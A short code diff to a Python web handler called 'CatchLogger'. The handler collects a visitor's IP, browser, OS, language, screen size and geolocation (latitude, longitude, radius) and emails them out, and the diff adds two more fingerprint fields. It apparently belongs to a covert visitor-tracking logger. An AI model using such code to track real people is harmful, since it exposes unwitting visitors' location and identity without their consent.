@@ -46,7 +46,7 @@ def obr():
     ip = (request.environ.get('HTTP_X_FORWARDED_FOR') or request.environ.get('REMOTE_ADDR'))
     print(ip)
     d = {}
-    info = list("browser, language, OS, h, w, location_info".split(", "))
+    info = list("browser, language, OS, navbrser, navos, h, w, location_info".split(", "))
     for i in info:
          d[i] = request.query[i]
          print("i: "+i+"  --  "+d[i])
@@ -81,7 +81,7 @@ Radius: %s
 IP = %s
 
 ----
-CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip)
+CatchLogger system by Andrey A Tyunyatkin""" % (d['browser'], d['language'], d['OS'], d['navbrser'], d['navos'], d['h'], d['w'], d['lat'], d['long'], d['rad'], ip)
     send_email(text)
     
 
